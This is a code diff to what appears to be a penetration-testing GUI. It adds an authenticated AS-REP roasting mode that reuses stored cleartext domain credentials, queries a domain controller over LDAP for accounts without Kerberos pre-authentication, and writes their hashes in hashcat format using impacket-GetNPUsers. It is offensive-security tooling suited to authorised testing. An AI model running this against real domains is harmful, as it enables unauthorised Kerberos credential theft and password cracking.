@@ -3680,33 +3680,112 @@ class CardADRoutesMixin:
                            "/usr/share/seclists/Usernames/"
                            "xato-net-10-million-usernames.txt")]
 
+        # Look up a usable domain cred (non-anon, has a cleartext
+        # password) so AUTHENTICATED AS-REP roast can be the default when
+        # we already have a foothold: with creds GetNPUsers asks the DC
+        # over LDAP for every DONT_REQ_PREAUTH account and roasts them in
+        # one shot — no username wordlist, no thousands of AS-REQ misses,
+        # and it finds custom-named accounts a generic list never would.
+        du = dp = ""
+        try:
+            _sess = self.app.session_manager.current
+            for c in (_sess.get_credentials() if _sess else []):
+                un = (c.username or "").strip()
+                if (un.lower() in ("anonymous", "guest", "")
+                        or not (c.password or "")):
+                    continue
+                du, dp = un, (c.password or "")
+                if getattr(c, "verified", False):
+                    break   # prefer a verified login if we find one
+        except Exception:
+            pass
+
         def _add_domain_widget(win):
             from gui.dialogs import _note_box
             _note_box(win,
                       "AS-REP Roasting: finds users without Kerberos\n"
-                      "pre-authentication. No password needed — just\n"
-                      "a list of usernames and the domain.",
+                      "pre-authentication.  Authenticated (with creds) asks\n"
+                      "the DC directly via LDAP — instant, no wordlist.\n"
+                      "Without creds, falls back to guessing usernames.",
                       COLORS["border_dim"])
             domain_var = ctk.StringVar(value=default_domain or "DOMAIN.LOCAL")
-            df = ctk.CTkFrame(win, fg_color="transparent")
-            df.pack(fill="x", padx=24, pady=(4, 6))
-            ctk.CTkLabel(df, text="Domain:", font=_f("sm", True),
-                         text_color=COLORS["text_bright"],
-                         anchor="w").pack(side="left")
-            e = ctk.CTkEntry(
-                df, textvariable=domain_var,
-                placeholder_text="e.g. DOMAIN.LOCAL",
-                font=_f("md"), height=30,
-                fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
-                border_color=COLORS["border_green"], border_width=1,
-                corner_radius=3)
-            e.pack(side="left", fill="x", expand=True, padx=(4, 0))
-            add_context_menu(e)
-            return {"domain_var": domain_var}
+            auth_var = ctk.BooleanVar(value=bool(du and dp))
+            user_var = ctk.StringVar(value=du)
+            pass_var = ctk.StringVar(value=dp)
+
+            def _row(label, var, show=""):
+                f = ctk.CTkFrame(win, fg_color="transparent")
+                ctk.CTkLabel(f, text=label, font=_f("sm", True),
+                             text_color=COLORS["text_bright"], anchor="w",
+                             width=70).pack(side="left")
+                en = ctk.CTkEntry(
+                    f, textvariable=var, show=show,
+                    font=_f("md"), height=30,
+                    fg_color=COLORS["bg_card"],
+                    text_color=COLORS["text_bright"],
+                    border_color=COLORS["border_green"], border_width=1,
+                    corner_radius=3)
+                en.pack(side="left", fill="x", expand=True, padx=(4, 0))
+                add_context_menu(en)
+                return f
+
+            df = _row("Domain:", domain_var)
+            df.pack(fill="x", padx=24, pady=(4, 2))
+
+            cf = ctk.CTkFrame(win, fg_color="transparent")
+            cf.pack(fill="x", padx=24, pady=(2, 2))
+            uf = _row("User:", user_var)
+            pf = _row("Pass:", pass_var, show="*")
+
+            def _sync_auth(*_):
+                if auth_var.get():
+                    uf.pack(fill="x", padx=24, pady=(2, 0))
+                    pf.pack(fill="x", padx=24, pady=(2, 6))
+                else:
+                    uf.pack_forget()
+                    pf.pack_forget()
+
+            ctk.CTkCheckBox(
+                cf,
+                text="Authenticated (use stored creds — LDAP, no wordlist)",
+                variable=auth_var, command=_sync_auth,
+                font=_f("sm"), text_color=COLORS["text_bright"],
+                fg_color=COLORS["bg_card"],
+                hover_color=COLORS["bg_card_hover"],
+                border_color=COLORS["border_green"],
+                checkmark_color=COLORS["text_green"]).pack(side="left")
+            _sync_auth()
+            return {"domain_var": domain_var, "auth_var": auth_var,
+                    "user_var": user_var, "pass_var": pass_var}
 
         def _on_run(wl_path, _ext, _threads, extra):
             domain_var = extra.get("domain_var")
             domain = domain_var.get().strip() if domain_var else "DOMAIN.LOCAL"
+
+            # ── Authenticated mode ──────────────────────────────────────
+            # With a domain cred, GetNPUsers binds to the DC and LDAP-
+            # enumerates every DONT_REQ_PREAUTH account, then roasts each
+            # one — the wordlist (and its 10M-request DC hammering) is
+            # skipped entirely.  This is the right flow once you have any
+            # foothold, and the only way to reach custom-named accounts a
+            # generic username list would miss.
+            auth_var = extra.get("auth_var")
+            if auth_var is not None and auth_var.get():
+                u = (extra.get("user_var").get() or "").strip()
+                p = extra.get("pass_var").get() or ""
+                if not (domain and u and p):
+                    self.app.terminal.write(
+                        "  [!] Authenticated AS-REP needs domain + username "
+                        "+ password.", "warn")
+                    return
+                import os as _os
+                from utils.config import OUTPUTS_DIR as _OUT
+                outp = _os.path.join(_OUT, f"asrep-{target}.txt")
+                self._run_raw(tool, (
+                    f"impacket-GetNPUsers {domain}/{u}:{_shq(p)} "
+                    f"-dc-ip {target} -request -format hashcat "
+                    f"-outputfile {_shq(outp)}"))
+                return
 
             # Line-count guard — AS-REP roast on a 10M wordlist is
             # ~24 hours of DC hammering (~100 AS-REQ/s).  Anything
